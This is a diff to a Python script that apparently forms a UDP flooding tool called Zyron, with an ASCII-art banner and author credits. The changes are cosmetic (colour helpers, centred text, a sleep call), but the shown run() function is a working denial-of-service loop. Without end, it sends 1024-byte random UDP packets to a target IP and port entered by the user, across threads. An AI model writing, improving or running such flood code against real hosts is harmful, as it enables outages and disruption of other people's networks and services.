@@ -4,13 +4,16 @@ import sys
 import socket
 import threading
 import ipaddress
+import time
 
 os.system('clear' if os.name == 'posix' else 'cls')
 
-def yellow_text(text):
-    YELLOW = '\033[93m'
+def colored_text(text, color):
     RESET = '\033[0m'
-    print(YELLOW + text + RESET)
+    return f"{color}{text}{RESET}"
+
+def yellow_text(text):
+    return colored_text(text, '\033[93m')
 
 def is_valid_ipv4(ip):
     try:
@@ -23,30 +26,43 @@ def run(ip_run, port_run, times_run, threads_run):
     data_run = random._urandom(1024)
     try:
         while True:
-            print("\033[1;31m\033[0m \033[1mPacket sent to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""")
+            print(" " * 50 + "\033[1;31m\033[0m \033[1mPacket sent to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""")
             s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr_run = (str(ip_run), int(port_run))
             for x_run in range(times_run):
                 s_run.sendto(data_run, addr_run)
             s_run.close()
     except KeyboardInterrupt:
-        print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
+        print("\n" + " " * 50 + "\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m""")
         sys.exit(0)
     except Exception as e:
         sys.exit("\033[1;31m[!]\033[0m "f"\033[1;37m{e}\033[0m"".")
 
-def main():
-    text = """
- ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ ▄▄    ▄ 
-█       █  █ █  █   ▄  █ █       █  █  █ █
-█▄▄▄▄   █  █▄█  █  █ █ █ █   ▄   █   █▄█ █
- ▄▄▄▄█  █       █   █▄▄█▄█  █ █  █       █
-█ ▄▄▄▄▄▄█▄     ▄█    ▄▄  █  █▄█  █  ▄    █
-█ █▄▄▄▄▄  █   █ █   █  █ █       █ █ █   █
-█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█  █▄█▄▄▄▄▄▄▄█▄█  █▄▄█
+text = yellow_text("""
+                                        ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ ▄▄    ▄ 
+                                        █       █  █ █  █   ▄  █ █       █  █  █ █
+                                        █▄▄▄▄   █  █▄█  █  █ █ █ █   ▄   █   █▄█ █
+                                         ▄▄▄▄█  █       █   █▄▄█▄█  █ █  █       █
+                                        █ ▄▄▄▄▄▄█▄     ▄█    ▄▄  █  █▄█  █  ▄    █
+                                        █ █▄▄▄▄▄  █   █ █   █  █ █       █ █ █   █
+                                        █▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄█  █▄█▄▄▄▄▄▄▄█▄█  █▄▄█
+""")
+
+datas = """
+                                                     Author: Weaky 
+                                                    Version: 1.0.2A
+                                         GitHub: https://github.com/weakyi/zyron  
 """
-    yellow_text(text)
-    
+
+# "1.0.2A" ve "Weaky" değerlerini sarıya dönüştürme
+datas = datas.replace("1.0.2A", yellow_text("1.0.2A")).replace("Weaky", yellow_text("Weaky")).replace("https://github.com/weakyi/zyron", yellow_text("https://github.com/weakyi/zyron"))
+
+print(text)
+time.sleep(0.000000000000000000000000001)
+print(datas)
+
+
+def main():
     while True:
         try:
             target = input("\033[1;31m\033[0m ""\033[1;37mEnter IP or domain-->\033[0m ")
